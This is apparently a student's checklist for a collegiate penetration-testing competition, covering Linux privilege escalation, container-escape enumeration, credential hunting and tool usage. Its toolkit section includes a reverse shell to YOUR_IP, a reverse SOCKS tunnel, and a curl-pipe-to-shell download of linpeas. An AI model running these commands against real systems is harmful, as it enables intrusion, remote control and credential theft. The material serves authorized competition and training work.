# CPTC12 - Linux priv esc and container escape Checklist

---

Season: CPTC12 (2026–2027) | Client/Theme: Butters Family Farm (theme park) | Last updated: 2026-10-21

---

## Comp Start Checklist

- [ ] Connect to Windows host, then into Unix host.
- [ ] Check IP addresses. Write down subnets/IPs to **exclude**. Verify any target is **in scope** before running against it.
- [ ] Check tools already on the host: `git`, `curl`, `python3`, `nmap`.
- [ ] Clone the repo and run the install script to stage tools.
- [ ] **Start the command logger immediately** (inside `tmux`/`script` so a dropped jump-host session doesn't kill the log or scans).
- [ ] Straight enumeration — what ports are open across hosts. Sync with team on the network picture.
- [ ] Find **Linux hosts** in range; enumerate those deeper.
- [ ] Document every host scanned, even untouched ones. Keep the team in sync.
- [ ] Work is driven by findings / teammate needs. Promising open ports on in-scope IPs = good starting point. Document everything on every IP.
- [ ] **Any time I land on a new server/host, check whether it's a container.**


```bash
sudo apt install kali-linux-large
```

## 1. First in a system

```bash
id
```

```bash
whoami
```

```bash
hostname
```

```bash
uname -a
```

```bash
cat /etc/os-release
```

## 2. Container check


```bash
ls -la /.dockerenv
```

```bash
cat /proc/1/cgroup
```

```bash
systemd-detect-virt
```

```bash
cat /proc/1/environ | tr '\0' '\n'
```

## 3. priv esc checks

```bash
sudo -l
```

```bash
find / -perm -4000 -type f 2>/dev/null
```

## 4. Users & access

```bash
cat /etc/passwd
```

```bash
cat /etc/group
```

```bash
who
```

```bash
last
```

```bash
ls -la /home
```

```bash
cat ~/.bash_history
```

```bash
ls -la ~/.ssh/
```

## 5. Permissions and writable paths

```bash
find / -perm -2000 -type f 2>/dev/null
```

```bash
find / -writable -type d 2>/dev/null
```

```bash
find / -perm -o+w -type f 2>/dev/null
```

```bash
ls -la /etc/passwd
```

```bash
ls -la /etc/shadow
```

## 6. Scheduled tasks

```bash
cat /etc/crontab
```

```bash
ls -la /etc/cron.d
```

```bash
ls -la /etc/cron.*
```

```bash
crontab -l
```

```bash
cat /var/spool/cron/crontabs/* 2>/dev/null
```

```bash
systemctl list-timers
```

## 7. Processes and services

```bash
ps aux
```

```bash
systemctl list-units --type=service
```

## 8. Credential hunting

```bash
grep -riE "password|passwd|secret|api[_-]?key" /etc /home /var/www 2>/dev/null
```

```bash
find / -name "*.conf" 2>/dev/null
```

## 9. Network

```bash
ip addr
```

```bash
ip route
```

```bash
ss -tulnp
```

```bash
cat /etc/hosts
```

## 10. Container escape surface if in a container

```bash
capsh --print
```

```bash
mount
```

```bash
cat /proc/mounts
```

```bash
ls -la /dev
```

```bash
ls -la /var/run/docker.sock
```

```bash
ls -la /proc/1/ns/
```

```bash
cat /proc/self/uid_map
```

```bash
cat /proc/sys/kernel/core_pattern
```

## 11. Kubernetes if in a pod

```bash
ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
```

```bash
env | grep -i kube
```

## 12. Toolkit how to run each

### linpeas.sh all in one enumeration

```bash
/dev/shm/linpeas.sh
```

```bash
/dev/shm/linpeas.sh | tee /dev/shm/linpeas.out
```

### pspy watch processes/cron in real time no root needed

```bash
/dev/shm/pspy64
```

```bash
/dev/shm/pspy32
```

### deepce.sh container enumeration and escape suggestions

```bash
/dev/shm/deepce.sh
```

### cdk container exploitation toolkit

```bash
/dev/shm/cdk_amd64 evaluate
```

```bash
/dev/shm/cdk_386 evaluate
```

### chisel pivot / tunnel through a host

Run the server on your box, then the client on the target.

```bash
# on YOUR box (server, reverse SOCKS listener)
./chisel server -p 8080 --reverse
```

```bash
# on the TARGET (client, reverse SOCKS back to you)
/dev/shm/chisel_amd64 client YOUR_IP:8080 R:socks
```

### ncat listener / reverse shell catch / transfer

```bash
/dev/shm/ncat -lvnp 4444
```

```bash
/dev/shm/ncat YOUR_IP 4444 -e /bin/bash
```

### curl pull a tool onto the box

```bash
curl -o /dev/shm/linpeas.sh http://YOUR_IP/linpeas.sh
```

```bash
curl -fsSL http://YOUR_IP/linpeas.sh | sh
```

### penelope.py shell handler (run on YOUR box)

```bash
python3 penelope.py 4444
```

### GTFOBins grep the local clone for a binary (Compare with sudo -l)

```bash
ls GTFOBins/_gtfobins/ | grep -i BINARY
```

```bash
cat GTFOBins/_gtfobins/BINARY.md
```


### Extra random commands just to remember.
```bash
python3 -m http.server "port"
```